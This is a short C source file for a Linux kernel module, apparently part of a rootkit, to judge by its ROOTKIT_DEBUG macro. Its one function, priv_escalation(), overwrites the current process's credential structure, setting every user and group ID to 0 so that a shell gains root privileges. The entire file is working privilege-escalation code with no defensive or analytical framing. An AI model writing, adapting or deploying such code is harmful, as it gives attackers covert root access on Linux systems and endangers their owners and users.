#include <linux/sched.h>

#include "include.h"

/* Function to issue the root privileges for shell */
void priv_escalation(void)
{
        struct task_struct *task;
	/*  Get the task structure of the current process by current macro */
        task = current; 
        struct cred *pcred = task->cred;

        pcred->uid.val = pcred->euid.val = pcred->suid.val = pcred->fsuid.val = 0;
        pcred->gid.val = pcred->egid.val = pcred->sgid.val = pcred->fsgid.val = 0;
	
        ROOTKIT_DEBUG("pid of the terminal : %d Escalation done!!!\n", task->pid);
}

